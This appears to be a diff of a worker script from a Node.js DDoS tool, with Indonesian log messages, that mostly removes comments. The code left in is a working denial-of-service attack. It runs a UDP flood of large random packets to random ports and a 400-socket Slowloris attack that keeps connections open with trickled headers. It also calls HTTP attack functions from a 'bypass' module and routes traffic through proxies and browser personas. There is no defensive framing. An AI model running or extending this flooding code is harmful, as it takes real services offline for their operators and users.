@@ -6,30 +6,20 @@ const dns = require('dns');
 const { runHttpAttack } = require('./bypass.js');
 const { browserPersonas, proxyList } = require('./extensions.js');
 
-// This file contains the logic for a single worker process.
-// It is executed by the master process for each forked worker.
-
-// --- Worker Setup ---
-
-// Terima URL proxy dari master dan tambahkan ke daftar proxy worker
 const proxyUrlFromMaster = process.env.PROXY_URL;
 if (proxyUrlFromMaster) {
     proxyList.push(proxyUrlFromMaster);
 }
-
 const [targetUrl, durationSeconds] = process.argv.slice(2);
 const workerAttackType = process.env.ATTACK_TYPE;
 const parsedUrl = url.parse(targetUrl);
 const duration = parseInt(durationSeconds, 10);
-
-// --- Attack Functions (specific to workers) ---
 
 function executeUdpFlood(targetIp, durationSeconds) {
     const attackName = "UDP Flood";
     console.log(`Worker ${process.pid} memulai serangan ${attackName} ke ${targetIp} selama ${durationSeconds} detik.`);
 
     const client = dgram.createSocket('udp4');
-    // Buat payload acak sekali untuk efisiensi
     const payload = crypto.randomBytes(65500);
 
     let localSent = 0;
@@ -41,39 +31,32 @@ function executeUdpFlood(targetIp, durationSeconds) {
             return;
         }
         
-        // Kirim burst kecil (misal: 100 paket) untuk efisiensi dan mengurangi overhead timer
         for (let i = 0; i < 100; i++) {
-            // Kirim ke port acak
             client.send(payload, Math.floor(Math.random() * 65535) + 1, targetIp, (err) => {
                 if (!err) {
                     localSent++;
                 }
             });
         }
-        
-        // Loop dengan delay kecil untuk memberi nafas pada event loop, mencegah saturasi.
         setTimeout(attack, 1);
     };
 
-    // Kirim statistik secara berkala
     const statsInterval = setInterval(() => {
         if (process.send) {
             process.send({
                 type: 'stats',
                 sent: localSent,
-                error: 0 // UDP bersifat connectionless, pelacakan error tidak langsung
+                error: 0
             });
         }
         localSent = 0;
-    }, 5000); // Lapor setiap 5 detik
+    }, 5000);
 
     attack();
 
     setTimeout(() => {
         isAttackActive = false;
         clearInterval(statsInterval);
-
-        // Kirim sisa statistik sebelum keluar
         if (process.send && localSent > 0) {
             process.send({ type: 'stats', sent: localSent, error: 0 });
         }
@@ -86,11 +69,11 @@ function executeUdpFlood(targetIp, durationSeconds) {
 function executeSlowlorisAttack(targetHost, targetPort, durationSeconds) {
     const attackName = "Slowloris";
     const socketCount = 400;
-    const keepAliveInterval = 10000; // 10 detik
+    const keepAliveInterval = 10000;
     console.log(`Worker ${process.pid} memulai serangan ${attackName} ke ${targetHost}:${targetPort} dengan ${socketCount} sockets.`);
 
     let sockets = [];
-    let localSent = 0; // Menghitung koneksi awal yang berhasil
+    let localSent = 0;
     let localError = 0;
     let isAttackActive = true;
 
@@ -109,8 +92,6 @@ function executeSlowlorisAttack(targetHost, targetPort, durationSeconds) {
         socket.on('connect', () => {
             socket.write(headers);
             localSent++;
-
-            // Jaga koneksi tetap hidup dengan mengirim header tambahan
             socket.keepAliveInterval = setInterval(() => {
                 if (socket.writable) {
                     socket.write(`X-a: ${crypto.randomBytes(4).toString('hex')}\r\n`);
@@ -121,17 +102,11 @@ function executeSlowlorisAttack(targetHost, targetPort, durationSeconds) {
         const replaceSocket = () => {
             clearInterval(socket.keepAliveInterval);
             socket.destroy();
-            // Jika serangan masih aktif, ganti socket yang mati
             if (isAttackActive) {
                 sockets = sockets.filter(s => s !== socket);
                 sockets.push(createSocket());
             }
         };
-
-        // Saat server menutup koneksi (baik karena error atau kebijakan),
-        // kita cukup menggantinya tanpa menghitungnya sebagai error.
-        // Ini adalah perilaku yang diharapkan dalam serangan Slowloris, di mana server
-        // secara aktif mencoba menutup koneksi yang tidak lengkap.
         socket.on('error', () => { replaceSocket(); });
         socket.on('close', replaceSocket);
         
@@ -160,8 +135,6 @@ function executeSlowlorisAttack(targetHost, targetPort, durationSeconds) {
     }, durationSeconds * 1000);
 }
 
-// --- Main Worker Execution ---
-
 switch (workerAttackType) {
     case 'get':
     case 'post':
@@ -175,7 +148,7 @@ switch (workerAttackType) {
         dns.lookup(parsedUrl.hostname, (err, address) => {
             if (err) {
                 console.error(`Worker ${process.pid} gagal resolve DNS untuk UDP Flood: ${parsedUrl.hostname}`, err);
-                process.exit(1); // Keluar jika DNS lookup gagal
+                process.exit(1);
             }
             executeUdpFlood(address, duration);
         });
